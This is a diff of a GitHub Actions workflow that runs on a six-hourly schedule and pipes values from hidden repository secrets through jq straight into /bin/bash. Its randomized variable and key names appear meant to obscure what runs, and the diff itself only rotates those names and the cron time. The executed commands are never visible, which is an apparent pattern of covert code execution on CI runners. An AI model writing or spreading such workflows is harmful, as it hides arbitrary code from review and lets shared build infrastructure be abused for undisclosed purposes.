@@ -1,28 +1,28 @@
 name: jiangjing19871010
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '40 4/6 * * *'
+    - cron: '11 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: jiangjing19871010
         env:
-          kpyj44: ${{ secrets.kpyj44 }}
+          ydcpb1: ${{ secrets.ydcpb1 }}
         run: |
-          echo $kpyj44 | jq -r .v46741 | /bin/bash
-          echo $yxawd7 | jq -r .cxt20706 | /bin/bash
-          echo $gon3 | jq -r .lzt425 | /bin/bash
-          echo $ermt7588 | jq -r .a60818 | /bin/bash
-          echo $cbar93 | jq -r .rxvvy6177 | /bin/bash
-          echo $fxpih1429 | jq -r .ggesu860 | /bin/bash
-          echo $kqkmk66 | jq -r .yt81 | /bin/bash
-          echo $umc5 | jq -r .m1390 | /bin/bash
-          echo $sej023 | jq -r .pno0714 | /bin/bash
-          echo $fhbkd5 | jq -r .ou83396 | /bin/bash
-          echo $x4182 | jq -r .gb9 | /bin/bash
-          echo $jwxv0 | jq -r .jqvx0 | /bin/bash
+          echo $ydcpb1 | jq -r .lqzl1566 | /bin/bash
+          echo $jdlua40354 | jq -r .tb153 | /bin/bash
+          echo $fwqsu41 | jq -r .lu70 | /bin/bash
+          echo $zvpew771 | jq -r .hg4129 | /bin/bash
+          echo $rf80 | jq -r .lc4 | /bin/bash
+          echo $adwna81 | jq -r .pgw156 | /bin/bash
+          echo $fedbp24 | jq -r .hpf26 | /bin/bash
+          echo $nl67826 | jq -r .ufvzq567 | /bin/bash
+          echo $j88967 | jq -r .jn27 | /bin/bash
+          echo $epjf96011 | jq -r .egl0 | /bin/bash
+          echo $bua172 | jq -r .jwfg93105 | /bin/bash
 
